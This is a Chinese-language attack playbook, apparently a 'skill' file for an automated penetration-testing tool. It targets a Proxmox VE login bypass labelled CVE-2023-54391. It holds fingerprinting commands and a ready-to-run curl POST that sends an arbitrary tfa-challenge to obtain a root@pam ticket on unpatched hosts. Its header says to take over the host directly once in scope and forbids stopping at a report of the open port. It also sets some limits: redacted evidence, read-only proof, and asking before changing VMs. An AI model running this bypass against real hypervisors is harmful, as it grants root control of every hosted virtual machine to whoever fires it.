# Proxmox VE 免密接管手法（CVE-2023-54391）

> Skill：`杀招/虚机府`  
> 路由：`python3 炼蛊房/nday_route.py --signal "proxmox CVE-2023-54391"`  
> 红线：目标在 scope。拿到 ticket = 宿主机 root，授权内直接做。禁止只报 `:8006` 结案。

---

## 1. 一句话

`POST /api2/json/access/ticket` 带任意 `tfa-challenge` 时，无 2FA 的 `root@pam` 会跳过密码校验并签发全权票据。影响 PVE 7.0–7.4 与 8.0.0–8.0.3（`libpve-access-control` < 8.0.4）。

---

## 2. 开场

```bash
python3 炼蛊房/nday_route.py --signal "proxmox CVE-2023-54391"
curl -sk "https://TARGET:8006/api2/json/version"
curl -sk "https://TARGET:8006/" | grep -i proxmox
```

L1：版本 / 登录页指纹。  
L2：`:8006` API 可达。  
L3：响应含 `ticket` + `CSRFPreventionToken`。

---

## 3. 授权内验证

```bash
curl -sk -X POST "https://TARGET:8006/api2/json/access/ticket" \
  -d "username=root@pam&password=x&tfa-challenge=x"
```

200 + `data.ticket` → 接管成立。401 → 已修或账户开了 2FA。

证据写 `案卷/proxmox/`：请求、状态码、**脱敏**后的 ticket 前缀。不要把完整票据写进可同步文档。

有票据后只做只读证明（`/nodes`、`/cluster/resources?type=vm`）。改 VM / 清盘先问。

---

## 4. 已有 shell 时

```bash
dpkg -l libpve-access-control
grep -c 'verify_ticket($tfa_challenge, 0, $username)' \
  /usr/share/perl5/PVE/AccessControl.pm
# 3 = 已修；<3 = 受影响
```
